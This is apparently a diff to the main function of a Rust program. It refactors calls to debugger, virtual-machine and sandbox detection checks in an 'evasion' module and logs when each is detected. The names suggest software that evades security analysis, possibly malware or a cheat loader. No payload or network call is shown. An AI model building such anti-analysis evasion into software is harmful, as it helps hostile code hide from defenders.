@@ -72,14 +72,14 @@ fn main() {
     };
 
     // Run anti-analysis checks
-    if let Err(e) = evasion::check_debugger() {
-        eprintln!("[main] Debugger check failed: {}", e);
+    if evasion::check_debugger() {
+        eprintln!("[main] Debugger detected");
     }
-    if let Err(e) = evasion::check_vm() {
-        eprintln!("[main] VM check failed: {}", e);
+    if evasion::check_vm() {
+        eprintln!("[main] VM detected");
     }
-    if let Err(e) = evasion::check_sandbox() {
-        eprintln!("[main] Sandbox check failed: {}", e);
+    if evasion::check_sandbox() {
+        eprintln!("[main] Sandbox detected");
     }
 
     if let Err(e) = apply_hwid_config(&config) {
